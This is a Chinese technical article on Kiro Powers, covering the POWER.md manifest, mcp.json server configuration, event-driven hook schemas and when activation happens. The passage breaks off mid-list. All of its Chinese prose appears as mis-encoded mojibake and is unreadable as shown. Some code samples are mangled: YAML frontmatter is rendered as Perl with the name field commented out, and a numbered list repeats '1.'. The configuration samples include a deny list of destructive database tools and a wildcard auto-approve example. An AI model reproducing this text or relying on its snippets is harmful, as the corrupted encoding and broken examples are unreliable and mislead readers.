<p>åœ¨äººå·¥æ™ºèƒ½è¾…åŠ©è½¯ä»¶å·¥ç¨‹ï¼ˆAISEï¼‰çš„å¿«é€Ÿæ¼”è¿›ä¸­ï¼Œé›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰æ­£ä»å•çº¯çš„ä»£ç è¡¥å…¨å·¥å…·è½¬å˜ä¸ºå…·å¤‡è‡ªä¸»æ¨ç†èƒ½åŠ›çš„æ™ºèƒ½ä»£ç†ç³»ç»Ÿã€‚ç„¶è€Œï¼Œéšç€å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰è¢«èµ‹äºˆè¶Šæ¥è¶Šå¤šçš„å¤–éƒ¨å·¥å…·ã€åº“å’Œæ–‡æ¡£è®¿é—®æƒé™ï¼Œä¸€ä¸ªè¢«ç§°ä¸ºâ€œä¸Šä¸‹æ–‡è¿‡è½½ï¼ˆContext Overloadï¼‰â€çš„å…³é”®ç“¶é¢ˆæ—¥ç›Šå‡¸æ˜¾ã€‚å½“ä»£ç†ç¨‹åºè¯•å›¾åŒæ—¶åŠ è½½AWSã€Kubernetesã€Reactå’ŒStripeç­‰å¤šä¸ªæŠ€æœ¯æ ˆçš„å®Œæ•´ä¸Šä¸‹æ–‡æ—¶ï¼Œä»¤ç‰Œï¼ˆTokenï¼‰æ¶ˆè€—é‡ä¸ä»…ä¼šè¿…é€Ÿè€—å°½æœ‰é™çš„ä¸Šä¸‹æ–‡çª—å£ï¼Œè¿˜ä¼šå› ä¿¡æ¯ä¿¡å™ªæ¯”çš„é™ä½å¯¼è‡´æ¨¡å‹æ¨ç†èƒ½åŠ›çš„æ˜¾è‘—é€€åŒ–ï¼Œè¿™ç§ç°è±¡è¢«ç§°ä¸ºâ€œä¸Šä¸‹æ–‡è…çƒ‚ï¼ˆContext Rotï¼‰â€1ã€‚</p>
<p>Kiro Powers ä»£è¡¨äº†è§£å†³è¿™ä¸€æŒ‘æˆ˜çš„èŒƒå¼è½¬å˜ã€‚ä¸ä¼ ç»Ÿé™æ€ã€å…¨å±€æ€§çš„ä¸Šä¸‹æ–‡ç®¡ç†ä¸åŒï¼ŒPowers å¼•å…¥äº†ä¸€ç§åŠ¨æ€çš„ã€å³æ—¶ç¼–è¯‘ï¼ˆJust-In-Timeï¼‰çš„æ¶æ„ã€‚ä¸€ä¸ªâ€œPowerâ€ä¸ä»…ä»…æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒæ˜¯é¢†åŸŸä¸“é•¿çš„æ¨¡å—åŒ–å°è£…ï¼Œèåˆäº†è¡Œä¸ºå¼•å¯¼ï¼ˆSteeringï¼‰ã€æ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ˆMCPï¼‰æœåŠ¡å™¨é…ç½®ä»¥åŠäº‹ä»¶é©±åŠ¨çš„é’©å­ï¼ˆHooksï¼‰3ã€‚è¿™äº›æ¨¡å—åœ¨é»˜è®¤çŠ¶æ€ä¸‹ä¿æŒä¼‘çœ ï¼Œä»…åœ¨æ£€æµ‹åˆ°ç‰¹å®šçš„è¯­ä¹‰è§¦å‘å™¨â€”â€”å¦‚å…³é”®è¯ã€æ–‡ä»¶æ¨¡å¼æˆ–ä»£ç†æ„å›¾â€”â€”æ—¶æ‰è¢«æ¿€æ´»ï¼Œä»è€Œåœ¨ä¿æŒè½»é‡çº§ä¸Šä¸‹æ–‡çª—å£çš„åŒæ—¶ï¼Œä¿ç•™äº†å¯¹æ·±åº¦ä¸“ä¸šèƒ½åŠ›çš„è®¿é—®æƒé™5ã€‚</p>
<hr/>
<h2 data-id="heading-1">2. è¯­å¢ƒç»æµå­¦ä¸ Kiro Powers çš„æ¶æ„å¿…è¦æ€§</h2>
<h3 data-id="heading-2">2.1 ä¸Šä¸‹æ–‡æ•ˆç‡æ‚–è®ºä¸ä»¤ç‰Œç»æµ</h3>
<p>åœ¨ä¼ ç»Ÿçš„åŸºäº LLM çš„ IDE åº”ç”¨ä¸­ï¼Œä¸Šä¸‹æ–‡ç®¡ç†é€šå¸¸æ˜¯åŠ æ³•å¼çš„ã€‚å¦‚æœå¼€å‘äººå‘˜åŒæ—¶å¤„ç†åç«¯åŸºç¡€è®¾æ–½ã€æ”¯ä»˜ç½‘å…³å’Œå‰ç«¯æ¡†æ¶ï¼Œç³»ç»Ÿå¾€å¾€ä¼šå°è¯•åŒæ—¶åŠ è½½è¿™ä¸‰ä¸ªé¢†åŸŸçš„æ‰€æœ‰ SDK å®šä¹‰ã€API æ¨¡å¼å’Œæœ€ä½³å®è·µã€‚å¯¹ç°æœ‰ç ”ç©¶ç‰‡æ®µçš„åˆ†æè¡¨æ˜ï¼Œä»…è¿æ¥äº”ä¸ªæ ‡å‡†çš„ MCP æœåŠ¡å™¨å°±å¯èƒ½åŠ è½½è¶…è¿‡ 100 ä¸ªå·¥å…·å®šä¹‰ï¼Œæ¶ˆè€—çº¦ 50,000 ä¸ªä»¤ç‰Œ1ã€‚è¿™ç§é¥±å’ŒçŠ¶æ€å¯¼è‡´æ¨¡å‹æ¨ç†ä¸ä»…å˜æ…¢ï¼Œè€Œä¸”æ›´å®¹æ˜“äº§ç”Ÿå¹»è§‰ï¼Œå› ä¸ºæ¨¡å‹å¿…é¡»åœ¨å¤§é‡æ— å…³çš„å¹²æ‰°ä¿¡æ¯ä¸­å¯»æ‰¾ç›¸å…³æŒ‡ä»¤ã€‚</p>
<p>Kiro Powers é€šè¿‡å°†ä¸Šä¸‹æ–‡è§†ä¸ºä¸€ç§ä¸“é—¨çš„ã€å¯åŠ è½½çš„èµ„äº§æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚è¿™ç§æ¶æ„ç±»ä¼¼äºæ“ä½œç³»ç»Ÿçš„â€œåŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰â€æˆ–æ¸¸æˆæ§åˆ¶å°çš„â€œå¡å¸¦â€æ¨¡å‹ï¼Œä½†åº”ç”¨äºä»£ç†çš„è®¤çŸ¥çŠ¶æ€ç®¡ç†ã€‚</p>
<h3 data-id="heading-3">2.2 Power Bundle çš„è§£å‰–å­¦ç»“æ„</h3>
<p>ä»æ–‡ä»¶ç³»ç»Ÿçš„è§’åº¦æ¥çœ‹ï¼ŒKiro Power ä¸æ˜¯å•ä¸ªæ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ä¸ªå¼ºåˆ¶æ‰§è¡Œä¸¥æ ¼æ¨¡å¼çš„ç›®å½•åŒ…ã€‚è¯¥ç›®å½•ç»“æ„æ—¨åœ¨å°†å…ƒæ•°æ®ã€å·¥å…·é…ç½®å’Œè¡Œä¸ºå¼•å¯¼é€»è¾‘ç‰©ç†åˆ†ç¦»ï¼Œä»¥æ”¯æŒæ¨¡å—åŒ–åŠ è½½ã€‚</p>
<p><strong>æ ‡å‡†ç›®å½•ç»“æ„è§„èŒƒï¼š</strong></p>





















































<table><thead><tr><th><strong>è·¯å¾„/æ–‡ä»¶</strong></th><th><strong>å¿…é€‰æ€§</strong></th><th><strong>åŠŸèƒ½æè¿°</strong></th><th><strong>æ ¸å¿ƒä½œç”¨</strong></th></tr></thead><tbody><tr><td><code>my-power/</code></td><td>Root</td><td>æ ¹ç›®å½•</td><td>å‘½åç©ºé—´å®¹å™¨</td></tr><tr><td><code>â”œâ”€â”€ POWER.md</code></td><td><strong>å¿…é€‰</strong></td><td>æ¸…å•æ–‡ä»¶ã€å…ƒæ•°æ®ä¸æ¿€æ´»é€»è¾‘</td><td>å®šä¹‰ Power çš„èº«ä»½ã€è§¦å‘æ¡ä»¶åŠé«˜çº§è¯´æ˜ä¹¦</td></tr><tr><td><code>â”œâ”€â”€ mcp.json</code></td><td>å¯é€‰</td><td>å·¥å…·æ¡¥æ¥é…ç½®</td><td>å®šä¹‰ä¸å¤–éƒ¨ MCP æœåŠ¡å™¨çš„è¿æ¥å‚æ•°ä¸ç¯å¢ƒå˜é‡</td></tr><tr><td><code>â”œâ”€â”€ steering/</code></td><td>å¯é€‰</td><td>ç»†ç²’åº¦ä¸Šä¸‹æ–‡æ³¨å…¥ç›®å½•</td><td>å­˜æ”¾ç‰¹å®šå­ä»»åŠ¡çš„å¼•å¯¼æ–‡ä»¶ï¼Œé¿å…ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰æ–‡æ¡£</td></tr><tr><td><code>â”‚ â”œâ”€â”€ workflows.md</code></td><td>-</td><td>è¿‡ç¨‹æ€§çŸ¥è¯†</td><td>é’ˆå¯¹ç‰¹å®šä»»åŠ¡ï¼ˆå¦‚æ•°æ®åº“è¿ç§»ï¼‰çš„æ­¥éª¤æŒ‡å—</td></tr><tr><td><code>â”‚ â”œâ”€â”€ policies.md</code></td><td>-</td><td>çº¦æŸæ€§çŸ¥è¯†</td><td>ç¼–ç è§„èŒƒã€ç¦æ­¢æ¨¡å¼ä¸å®‰å…¨ç­–ç•¥</td></tr><tr><td><code>â””â”€â”€ hooks/</code></td><td>å¯é€‰</td><td>äº‹ä»¶é©±åŠ¨è‡ªåŠ¨åŒ–è„šæœ¬</td><td>å®šä¹‰æ–‡ä»¶ä¿å­˜ã€åˆ›å»ºç­‰ç”Ÿå‘½å‘¨æœŸäº‹ä»¶çš„å“åº”é€»è¾‘</td></tr></tbody></table>
<h4 data-id="heading-4">2.2.1 æ ¸å¿ƒæ¸…å•ï¼ˆ<code>POWER.md</code>ï¼‰</h4>
<p><code>POWER.md</code> æ˜¯ Power çš„å…¥å£ç‚¹ã€‚å®ƒåˆ©ç”¨ YAML å‰ç½®å…ƒæ•°æ®ï¼ˆFrontmatterï¼‰æ¥å®šä¹‰ Power çš„è¯­ä¹‰è¾¹ç•Œâ€”â€”å³å®ƒä½•æ—¶åº”è¯¥â€œè‹é†’â€ã€‚æ–‡ä»¶çš„ä¸»ä½“éƒ¨åˆ†åˆ™å……å½“ä»£ç†çš„â€œå…¥èŒæ‰‹å†Œâ€ï¼Œåœ¨ Power è¢«æ¿€æ´»çš„ç¬é—´æ³¨å…¥åˆ°ç³»ç»Ÿæç¤ºè¯ï¼ˆSystem Promptï¼‰ä¸­ï¼ŒæŒ‡å¯¼ä»£ç†å¦‚ä½•ä½¿ç”¨éšååŠ è½½çš„å·¥å…·4ã€‚</p>
<h4 data-id="heading-5">2.2.2 å·¥å…·æ¡¥æ¢ï¼ˆ<code>mcp.json</code>ï¼‰</h4>
<p>æ­¤æ–‡ä»¶å°† Power æ˜ å°„åˆ°é€šè¿‡æ¨¡å‹ä¸Šä¸‹æ–‡åè®®æä¾›çš„å¤–éƒ¨èƒ½åŠ›ã€‚å®ƒå®šä¹‰äº†å®ä¾‹åŒ– MCP æœåŠ¡å™¨æ‰€éœ€çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€å‚æ•°ã€ç¯å¢ƒå˜é‡å’Œç½‘ç»œç«¯ç‚¹ã€‚ä¸å…¨å±€ MCP è®¾ç½®ä¸åŒï¼Œè¿™äº›é…ç½®çš„ä½œç”¨åŸŸä¸¥æ ¼é™åˆ¶åœ¨ Power çš„æ¿€æ´»ç”Ÿå‘½å‘¨æœŸå†…ã€‚</p>
<hr/>
<h2 data-id="heading-6">3. è¯¦å°½çš„é…ç½®è¯­æ³•ä¸æ ¼å¼è§„èŒƒ</h2>
<p>Power çš„ç¨³å¥æ€§å®Œå…¨å–å†³äºå…¶é…ç½®æ–‡ä»¶çš„ç²¾åº¦ã€‚ä»¥ä¸‹æ˜¯å¯¹æ¯ä¸ªç»„ä»¶çš„è¯¦ç»†æŠ€æœ¯è§„èŒƒè¯´æ˜ã€‚</p>
<h3 data-id="heading-7">3.1 <code>POWER.md</code> è§„èŒƒä¸ YAML Frontmatter</h3>
<p><code>POWER.md</code> æ–‡ä»¶çš„å¤´éƒ¨å¿…é¡»åŒ…å«ä¸€ä¸ªä¸¥æ ¼çš„ YAML frontmatter å—ã€‚è¿™ä¸ªå—ä¼šè¢« Kiro IDE çš„æ„å›¾æ£€æµ‹å¼•æ“è§£æï¼Œç”¨äºæ„å»ºè·¯ç”±ç´¢å¼•ã€‚</p>
<p><strong>å®Œæ•´è¯­æ³•å‚è€ƒï¼š</strong></p>
<hr/>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># name: "aws-cdk-infrastructure" # å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå»ºè®®ä½¿ç”¨ kebab-case </span>
displayName: <span class="hljs-string">"AWS CDK Infrastructure Expert"</span> <span class="hljs-comment"># UI æ˜¾ç¤ºåç§° </span>
description: <span class="hljs-string">"Provides specialized tools and best practices for defining cloud infrastructure using AWS CDK, including CloudFormation validation and deployment workflows."</span> 
keywords: [<span class="hljs-string">"aws"</span>, <span class="hljs-string">"cdk"</span>, <span class="hljs-string">"cloudformation"</span>, <span class="hljs-string">"infrastructure"</span>, <span class="hljs-string">"deploy"</span>, <span class="hljs-string">"stack"</span>] <span class="hljs-comment"># æ ¸å¿ƒè§¦å‘è¯</span>

<span class="hljs-comment"># Power Instructions</span>

<span class="hljs-comment">## Purpose</span>

<span class="hljs-comment">## Capabilities</span>

-   **Infrastructure Definitions**: Generating TypeScript CDK constructs.
-   **Validation**: Checking stacks against security policies.
-   **Deployment**: synthesizing CloudFormation templates.

<span class="hljs-comment">## Onboarding</span>

[ä»£ç†åœ¨é¦–æ¬¡æ¿€æ´»æ­¤ Power æ—¶åº”æ‰§è¡Œçš„æ£€æŸ¥æ­¥éª¤ã€‚ä¾‹å¦‚ï¼š]

<span class="hljs-number">1</span>.  Check <span class="hljs-keyword">if</span> <span class="hljs-string">`cdk.json`</span> <span class="hljs-keyword">exists</span> in the root.
<span class="hljs-number">1</span>.  Verify AWS credentials are accessible in the environment.
<span class="hljs-number">1</span>.  Suggest installing the specific CDK version matches <span class="hljs-string">`package.json`</span>.

<span class="hljs-comment">## Best Practices</span>

-   Always <span class="hljs-keyword">use</span> specific versions <span class="hljs-keyword">for</span> Construct Libraries.
-   Enable deletion protection <span class="hljs-keyword">for</span> stateful resources like RDS <span class="hljs-keyword">and</span> S3 buckets.

</code></pre>
<p><strong>å­—æ®µæ·±åº¦è§£æï¼š</strong></p>
<ul>
<li><strong><code>name</code></strong>: ä¸€ä¸ªç¬¦åˆ kebab-case çš„æ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚ <code>aws-cdk-infrastructure</code>ï¼‰ã€‚å®ƒåœ¨å®‰è£…çš„ Power é›†ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚</li>
<li><strong><code>displayName</code></strong>: å‡ºç°åœ¨ Kiro UI â€œPowersâ€ é¢æ¿ä¸­çš„äººç±»å¯è¯»åç§°ã€‚</li>
<li><strong><code>description</code></strong>: å½“ç”¨æˆ·çš„è¾“å…¥ä¸åŒ…å«ç›´æ¥å…³é”®è¯åŒ¹é…æ—¶ï¼Œä»£ç†è·¯ç”±å±‚ä¼šä½¿ç”¨æ­¤æè¿°æ¥è¿›è¡Œè¯­ä¹‰ç›¸å…³æ€§è¯„ä¼°ã€‚å¦‚æœç”¨æˆ·é—®â€œå¦‚ä½•è®©æˆ‘çš„æœåŠ¡å™¨ä¸Šçº¿ï¼Ÿâ€ï¼Œå³ä½¿æ²¡æœ‰æåˆ°â€œAWSâ€ï¼Œè¯­ä¹‰åŒ¹é…ä¹Ÿå¯èƒ½æ ¹æ®æè¿°ä¸­çš„â€œdeploymentâ€æ¿€æ´»æ­¤ Power ã€‚</li>
<li><strong><code>keywords</code></strong>: ä¸»è¦çš„è§¦å‘æœºåˆ¶ã€‚æœ€ä½³å®è·µæ˜¯æ··åˆä½¿ç”¨é«˜é¢‘é€šç”¨è¯ï¼ˆå¦‚ "database"ï¼‰å’Œç‰¹å®šçš„æŠ€æœ¯åè¯ï¼ˆå¦‚ "Postgres", "RLS"ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-8">3.2 <code>mcp.json</code> æ·±åº¦é…ç½®æ¶æ„</h3>
<p><code>mcp.json</code> æ–‡ä»¶å†³å®šäº†ä»£ç†å¦‚ä½•ç‰©ç†è¿æ¥åˆ°å¤–éƒ¨å·¥å…·ã€‚å®ƒæ”¯æŒæœ¬åœ°å‘½ä»¤æ‰§è¡Œå’Œè¿œç¨‹ HTTP/SSE è¿æ¥ä¸¤ç§æ¨¡å¼ã€‚å…¶ç»“æ„å¿…é¡»ç¬¦åˆä¸¥æ ¼çš„ JSON è§„èŒƒã€‚</p>
<p><strong>Schema å®šä¹‰ä¸æ³¨è§£ï¼š</strong></p>
<p>JSON</p>
<pre><code class="hljs language-bash" lang="bash">{
  <span class="hljs-string">"mcpServers"</span>: {
    <span class="hljs-string">"local-server-example"</span>: {
      <span class="hljs-string">"command"</span>: <span class="hljs-string">"npx"</span>,
      <span class="hljs-string">"args"</span>: [
        <span class="hljs-string">"-y"</span>,
        <span class="hljs-string">"@modelcontextprotocol/server-postgres"</span>,
        <span class="hljs-string">"postgresql://localhost/mydb"</span>
      ],
      <span class="hljs-string">"env"</span>: {
        <span class="hljs-string">"PGPASSWORD"</span>: <span class="hljs-string">"<span class="hljs-variable">${PG_PASSWORD}</span>"</span>, 
        <span class="hljs-string">"NODE_ENV"</span>: <span class="hljs-string">"development"</span>
      },
      <span class="hljs-string">"disabled"</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-string">"autoApprove"</span>: [
        <span class="hljs-string">"query_table"</span>,
        <span class="hljs-string">"describe_schema"</span>
      ],
      <span class="hljs-string">"disabledTools"</span>: [
        <span class="hljs-string">"drop_table"</span>,
        <span class="hljs-string">"truncate_table"</span>
      ]
    },
    <span class="hljs-string">"remote-server-example"</span>: {
      <span class="hljs-string">"url"</span>: <span class="hljs-string">"https://mcp.supabase.com/v1/mcp"</span>,
      <span class="hljs-string">"headers"</span>: {
        <span class="hljs-string">"Authorization"</span>: <span class="hljs-string">"Bearer <span class="hljs-variable">${SUPABASE_KEY}</span>"</span>
      },
      <span class="hljs-string">"autoApprove"</span>: [<span class="hljs-string">"*"</span>]
    }
  }
}
</code></pre>
<p><strong>å…³é”®é…ç½®ç»†èŠ‚ä¸å®‰å…¨ç­–ç•¥ï¼š</strong></p>
<ul>
<li><strong>å˜é‡æ‰©å±•ï¼ˆVariable Expansionï¼‰</strong> : <code>${VAR_NAME}</code> è¯­æ³•å…è®¸è®¿é—®ç”¨æˆ·å…¨å±€ç¯å¢ƒæˆ–å·¥ä½œåŒº <code>.env</code> æ–‡ä»¶ä¸­çš„å˜é‡ã€‚è¿™æ˜¯é˜²æ­¢åœ¨å…±äº«çš„ Power ä¸­ç¡¬ç¼–ç æ•æ„Ÿå‡­æ®ï¼ˆå¦‚ API å¯†é’¥ï¼‰çš„å…³é”®æœºåˆ¶ã€‚</li>
<li><strong><code>autoApprove</code>ï¼ˆè‡ªåŠ¨æ‰¹å‡†ï¼‰</strong> : æ­¤æ•°ç»„å¯¹äºç”¨æˆ·ä½“éªŒè‡³å…³é‡è¦ã€‚å®ƒåˆ—å‡ºäº†ä»£ç†å¯ä»¥åœ¨ä¸æš‚åœç­‰å¾…ç”¨æˆ·ç¡®è®¤çš„æƒ…å†µä¸‹æ‰§è¡Œçš„å·¥å…·åç§°ã€‚å¯¹äºâ€œåªè¯»â€å·¥å…·ï¼ˆå¦‚è·å–æ–‡æ¡£ã€è¯»å–æ¶æ„ã€åˆ—å‡ºæ–‡ä»¶ï¼‰ï¼Œåº”å¡«å……æ­¤åˆ—è¡¨ä»¥ä¿æŒäº¤äº’æµç•…ã€‚å¦‚æœè®¾ç½®ä¸º <code>["*"]</code>ï¼Œåˆ™æ‰€æœ‰å·¥å…·éƒ½ä¼šè‡ªåŠ¨æ‰¹å‡†ï¼Œä½†è¿™é€šå¸¸åªå»ºè®®ç”¨äºå®Œå…¨æ— å‰¯ä½œç”¨çš„æœåŠ¡å™¨7ã€‚</li>
<li><strong><code>disabledTools</code>ï¼ˆç¦ç”¨å·¥å…·ï¼‰</strong> : æ˜¾å¼é˜»æ­¢ MCP æœåŠ¡å™¨æš´éœ²çš„ç‰¹å®šåŠŸèƒ½ã€‚è¿™åœ¨ä¼ä¸šç¯å¢ƒä¸­éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ï¼Œå…è®¸å¼€å‘äººå‘˜ä½¿ç”¨æ•°æ®åº“ MCP æŸ¥è¯¢æ•°æ®ï¼Œä½†é€šè¿‡é…ç½®ç¦ç”¨ <code>drop_table</code> æˆ– <code>delete_user</code> ç­‰å±é™©æ“ä½œï¼Œä»è€Œå®ç°æƒé™çš„ç»†ç²’åº¦æ§åˆ¶ã€‚</li>
</ul>
<h3 data-id="heading-9">3.3 äº‹ä»¶é©±åŠ¨çš„ Agent Hooks é…ç½®</h3>
<p>Hooksï¼ˆé’©å­ï¼‰æ˜¯å®šä¹‰åœ¨ <code>.kiro.hook</code> æ–‡ä»¶ä¸­çš„è‡ªåŠ¨åŒ–è„šæœ¬ã€‚è™½ç„¶å®ƒä»¬å¯ä»¥ç‹¬ç«‹å­˜åœ¨ï¼Œä½†åœ¨ Power ä¸­ï¼Œå®ƒä»¬é€šå¸¸ç”¨äºæ‰§è¡Œä¸é¢†åŸŸç›¸å…³çš„è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼ŒStripe Power å¯èƒ½æœ‰ä¸€ä¸ªé’©å­ï¼Œåœ¨æ£€æµ‹åˆ° <code>.env</code> æ–‡ä»¶æ›´æ”¹æ—¶éªŒè¯ Stripe API å¯†é’¥æ ¼å¼ï¼‰ã€‚</p>
<p><strong>Hooks JSON Schemaï¼š</strong></p>
<p>JSON</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Hook Name"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Description of the automation workflow"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"when"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fileEdited"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"patterns"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"**/*.ts"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"src/api/*.js"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"askAgent"</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-attr">"prompt"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Review the changes in {{filePath}}. Check for any hardcoded API keys..."</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run lint -- {{filePath}}"</span> 
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è§¦å‘å™¨ç±»å‹ (<code>when.type</code>) è¯¦è§£ï¼š</strong></p>
<ol>
<li><strong><code>fileCreated</code></strong>: å½“åŒ¹é…æ¨¡å¼çš„æ–°æ–‡ä»¶è¢«åˆ›å»ºæ—¶æ¿€æ´»ã€‚å¸¸ç”¨äºç”Ÿæˆæ ·æ¿ä»£ç ã€æ·»åŠ è®¸å¯è¯å¤´æˆ–åˆå§‹åŒ–é…ç½®æ–‡ä»¶8ã€‚</li>
<li><strong><code>fileEdited</code></strong>: å½“æ–‡ä»¶å†…å®¹è¢«ä¿®æ”¹æ—¶æ¿€æ´»ã€‚é€‚ç”¨äºå®æ—¶æ–‡æ¡£åŒæ­¥ã€å¢é‡æµ‹è¯•ç”Ÿæˆæˆ–ä»£ç é£æ ¼æ£€æŸ¥ã€‚</li>
<li><strong><code>fileSaved</code></strong>: ä¸ç¼–è¾‘ä¸åŒï¼Œä»…åœ¨ç”¨æˆ·æ˜¾å¼ä¿å­˜æ–‡ä»¶ï¼ˆCtrl+Sï¼‰æ—¶è§¦å‘ã€‚è¿™æ˜¯è¿è¡Œ Linterã€Formatter æˆ–è§¦å‘æ„å»ºè„šæœ¬çš„ç†æƒ³æ—¶æœºã€‚</li>
<li><strong><code>fileDeleted</code></strong>: æ–‡ä»¶è¢«åˆ é™¤æ—¶è§¦å‘ã€‚ç”¨äºæ¸…ç†å¼•ç”¨ã€æ›´æ–°ç´¢å¼•æ–‡ä»¶æˆ–ç§»é™¤è¿‡æ—¶çš„æµ‹è¯•æ–‡ä»¶ã€‚</li>
<li><strong><code>userTriggered</code></strong>: å…è®¸é€šè¿‡ Slash Commandsï¼ˆå¦‚ <code>/fix-lint</code>ï¼‰æ‰‹åŠ¨è§¦å‘é’©å­ï¼Œä¸ºç”¨æˆ·æä¾›æŒ‰éœ€çš„è‡ªåŠ¨åŒ–èƒ½åŠ›13ã€‚</li>
</ol>
<p><strong>åŠ¨ä½œç±»å‹ (<code>then.type</code>) è¯¦è§£ï¼š</strong></p>
<ol>
<li><strong><code>askAgent</code></strong>: å®ä¾‹åŒ–ä¸€ä¸ªåå°ä»£ç†ä¼šè¯æ¥æ‰§è¡Œè®¤çŸ¥ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œâ€œå®¡æŸ¥æ­¤ä»£ç æ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´â€ï¼‰ã€‚å¿…é¡»åŒ…å« <code>prompt</code> å­—æ®µã€‚è¿™æ˜¯ Kiro åŒºåˆ«äºä¼ ç»Ÿ Task Runner çš„æ ¸å¿ƒèƒ½åŠ›ã€‚</li>
<li><strong><code>runCommand</code> / <code>executeCommand</code></strong>: ç›´æ¥æ‰§è¡Œ Shell å‘½ä»¤ã€‚è¿™å¯¹äºé›†æˆ CLI å·¥å…·ï¼ˆå¦‚ <code>eslint</code>, <code>kubectl</code>, <code>aws</code>ï¼‰è‡³å…³é‡è¦ã€‚æ³¨æ„ï¼šåœ¨ä¸åŒçš„æ–‡æ¡£ç‰ˆæœ¬ä¸­ï¼Œæ­¤å­—æ®µå¯èƒ½è¢«ç§°ä¸º <code>execute_bash</code>ï¼Œä½†åœ¨æœ€æ–°çš„ IDE Hooks é…ç½®ä¸­ï¼Œæ ‡å‡†å€¾å‘äºä½¿ç”¨ <code>runCommand</code> æˆ– <code>executeCommand</code>ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-10">4. åŠ¨æ€æ¿€æ´»æœºåˆ¶ä¸è§¦å‘æ—¶æœºåˆ†æ</h2>
<p>Kiro Power çš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºå…¶â€œæŒ‰éœ€ï¼ˆOn-Demandï¼‰â€ç‰¹æ€§ã€‚ç†è§£å…¶æ¿€æ´»çš„ç®—æ³•é€»è¾‘å¯¹äºè®¾è®¡é«˜æ•ˆçš„ Power è‡³å…³é‡è¦ã€‚</p>
<h3 data-id="heading-11">4.1 è§¦å‘æ—¶æœºï¼šåœ¨æ¨ç†ä¹‹å‰ï¼ˆPre-Inferenceï¼‰</h3>
<p>ç”¨æˆ·æŸ¥è¯¢ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜æ˜¯ï¼šâ€œè§¦å‘æ—¶æœºæ˜¯åœ¨ AI å›å¤æ—¶è¿˜æ˜¯è¯·æ±‚æ—¶ï¼Ÿâ€</p>
<p><strong>ç»“è®ºï¼šè§¦å‘å‘ç”Ÿåœ¨â€œè¯·æ±‚å¤„ç†é˜¶æ®µï¼ˆRequest Processing Phaseï¼‰â€ï¼Œå³åœ¨ç”¨æˆ·å‘é€è¯·æ±‚ä¹‹åï¼Œä½†åœ¨ AI å¼€å§‹ç”Ÿæˆå›å¤ä¹‹å‰ã€‚</strong></p>
<p><strong>è¯¦ç»†æµç¨‹è§£æï¼š</strong></p>
<ol>
<li>
<p><strong>ç”¨æˆ·è¾“å…¥æˆªè·</strong>ï¼šå½“ç”¨æˆ·åœ¨èŠå¤©é¢æ¿è¾“å…¥â€œå¸®æˆ‘éƒ¨ç½²è¿™å¥—ä»£ç åˆ° AWSâ€å¹¶æŒ‰ä¸‹å›è½¦æ—¶ï¼ŒKiro çš„ç¼–æ’å±‚é¦–å…ˆæ‹¦æˆªè¯¥æ¶ˆæ¯ã€‚</p>
</li>
<li>
<p><strong>æ„å›¾ä¸å…³é”®è¯åŒ¹é…</strong>ï¼š</p>
<ul>
<li><strong>å…³é”®è¯æ‰«æ</strong>ï¼šç³»ç»Ÿæ‰«æè¾“å…¥ä¸­æ˜¯å¦åŒ…å«å·²å®‰è£… Powers çš„ <code>keywords</code> åˆ—è¡¨ä¸­çš„è¯æ±‡ï¼ˆå¦‚ "AWS", "deploy"ï¼‰ã€‚</li>
